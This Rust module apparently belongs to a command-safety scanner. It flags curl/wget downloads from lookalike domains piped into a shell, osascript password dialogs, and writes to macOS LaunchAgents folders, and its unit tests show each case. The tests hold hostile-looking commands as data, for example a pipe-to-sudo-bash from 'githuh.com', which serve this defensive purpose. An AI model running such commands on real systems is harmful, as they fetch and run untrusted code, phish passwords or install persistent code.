//! The before-a-command layer: rules that need the command split into words and pipeline
//! segments. Whole-string patterns stay in `rules/command.toml`.

mod domains;
mod parse;

use crate::finding::{Evidence, Finding, Layer, Severity};
use parse::Segment;

pub struct BuiltinRule {
    pub id: &'static str,
    pub title: &'static str,
    pub remediation: &'static str,
    macos_only: bool,
}

const LOOKALIKE: &str = "command/lookalike-download-domain";
const OSASCRIPT: &str = "command/osascript-password-prompt";
const LAUNCH_AGENT: &str = "command/launchagent-write";

pub const RULES: &[BuiltinRule] = &[
    BuiltinRule {
        id: LOOKALIKE,
        title: "The command downloads from a domain that imitates a well-known one",
        remediation: "Type the address yourself from the project's own documentation.",
        macos_only: false,
    },
    BuiltinRule {
        id: OSASCRIPT,
        title: "The command asks for a password through an osascript dialog",
        remediation: "Legitimate installers use the system's own prompt; do not type a password here.",
        macos_only: true,
    },
    BuiltinRule {
        id: LAUNCH_AGENT,
        title: "The command writes to a LaunchAgents folder, which runs code at every login",
        remediation: "Check what the plist runs before installing it.",
        macos_only: true,
    },
];

const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh"];
const FETCHERS: &[&str] = &["curl", "wget"];
const WRITERS: &[&str] = &[
    "cp", "mv", "ln", "install", "tee", "touch", "dd", "rsync", "curl", "wget", "defaults",
    "plutil",
];

/// Runs the rules that need a parsed command. `macos` says whether the macOS-only rules are
/// active; the engine passes the build platform, tests pass both.
pub fn analyze(command: &str, macos: bool) -> Vec<Finding> {
    let segments = parse::segments(command);
    let mut findings = Vec::new();
    for (i, seg) in segments.iter().enumerate() {
        let next = segments.get(i + 1);
        findings.extend(lookalike(seg, next, command));
        if macos {
            findings.extend(osascript(seg, command));
            findings.extend(launch_agent(seg, command));
        }
    }
    findings
}

/// Ids of the rules that exist but are not active on this platform.
pub fn skipped_rules(macos: bool) -> Vec<String> {
    if macos {
        return Vec::new();
    }
    RULES
        .iter()
        .filter(|r| r.macos_only)
        .map(|r| r.id.to_string())
        .collect()
}

fn finding(id: &str, severity: Severity, excerpt: &str) -> Finding {
    let rule = RULES.iter().find(|r| r.id == id).expect("known rule id");
    Finding {
        rule_id: rule.id.into(),
        severity,
        layer: Layer::Rules,
        title: rule.title.into(),
        evidence: Evidence::new(None, None, excerpt),
        remediation: rule.remediation.into(),
    }
}

/// Block when the download feeds a shell, warn when it is only fetched.
fn lookalike(seg: &Segment, next: Option<&Segment>, command: &str) -> Option<Finding> {
    if !seg.program().is_some_and(|p| FETCHERS.contains(&p)) {
        return None;
    }
    let (host, known) = seg.words.iter().find_map(|w| {
        let host = domains::host_of(w)?;
        let known = domains::imitates(&host).or_else(|| domains::spoofed_by_userinfo(w))?;
        Some((host, known))
    })?;
    let into_shell = seg.piped_into_next
        && next
            .and_then(Segment::program)
            .is_some_and(|p| SHELLS.contains(&p));
    let severity = if into_shell {
        Severity::Block
    } else {
        Severity::Warn
    };
    Some(finding(
        LOOKALIKE,
        severity,
        &format!("{host} imitates {known}: {command}"),
    ))
}

fn osascript(seg: &Segment, command: &str) -> Option<Finding> {
    if seg.program() != Some("osascript") {
        return None;
    }
    let script = seg.words.join(" ").to_lowercase();
    let asks = script.contains("hidden answer")
        || (script.contains("display dialog") && script.contains("password"));
    asks.then(|| finding(OSASCRIPT, Severity::Block, command))
}

fn launch_agent(seg: &Segment, command: &str) -> Option<Finding> {
    let writes = seg.program().is_some_and(|p| WRITERS.contains(&p))
        && seg.words.iter().any(|w| in_launch_agents(w))
        || redirect_targets(&seg.words).any(in_launch_agents);
    writes.then(|| finding(LAUNCH_AGENT, Severity::Block, command))
}

fn in_launch_agents(word: &str) -> bool {
    word.to_lowercase().contains("library/launchagents")
}

/// The targets of `>` and `>>` redirections, whether glued to the operator or in the next word.
fn redirect_targets(words: &[String]) -> impl Iterator<Item = &str> {
    words.iter().enumerate().filter_map(|(i, w)| {
        let rest = w.trim_start_matches(|c: char| c.is_ascii_digit() || c == '&');
        let target = rest.strip_prefix(">>").or_else(|| rest.strip_prefix('>'))?;
        if target.is_empty() {
            words.get(i + 1).map(String::as_str)
        } else {
            Some(target)
        }
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ids(command: &str, macos: bool) -> Vec<(String, Severity)> {
        analyze(command, macos)
            .into_iter()
            .map(|f| (f.rule_id, f.severity))
            .collect()
    }

    #[test]
    fn a_lookalike_piped_into_a_shell_blocks() {
        assert_eq!(
            ids("curl -fsSL githuh.com/install.sh | sudo bash", false),
            [(LOOKALIKE.to_string(), Severity::Block)]
        );
    }

    #[test]
    fn a_lookalike_only_downloaded_warns() {
        assert_eq!(
            ids("wget https://brev.sh/install -O i.sh", false),
            [(LOOKALIKE.to_string(), Severity::Warn)]
        );
    }

    #[test]
    fn the_known_domain_is_clean() {
        assert!(ids("curl -fsSL https://brew.sh/install | bash", false).is_empty());
    }

    #[test]
    fn a_lookalike_in_a_command_that_does_not_fetch_is_ignored() {
        assert!(ids("echo githuh.com | sh", false).is_empty());
    }

    #[test]
    fn macos_rules_run_only_when_enabled() {
        let cmd = "osascript -e 'display dialog \"x\" with hidden answer'";
        assert!(ids(cmd, false).is_empty());
        assert_eq!(ids(cmd, true), [(OSASCRIPT.to_string(), Severity::Block)]);
        assert!(ids("echo x >> ~/Library/LaunchAgents/a.plist", false).is_empty());
    }

    #[test]
    fn skipped_rules_name_the_macos_only_ids() {
        assert_eq!(skipped_rules(false), [OSASCRIPT, LAUNCH_AGENT]);
        assert!(skipped_rules(true).is_empty());
    }

    #[test]
    fn launch_agent_reads_are_not_writes() {
        for cmd in [
            "ls ~/Library/LaunchAgents",
            "cat ~/Library/LaunchAgents/a.plist > /tmp/out",
        ] {
            assert!(ids(cmd, true).is_empty(), "{cmd}");
        }
    }

    #[test]
    fn launch_agent_writes_are_found_by_redirect_and_by_program() {
        for cmd in [
            "echo x >> ~/Library/LaunchAgents/a.plist",
            "echo x >$HOME/Library/LaunchAgents/a.plist",
            "cp a.plist $HOME/Library/LaunchAgents/",
            "echo x | tee /Library/LaunchAgents/a.plist",
        ] {
            assert_eq!(ids(cmd, true).len(), 1, "{cmd}");
        }
    }
}
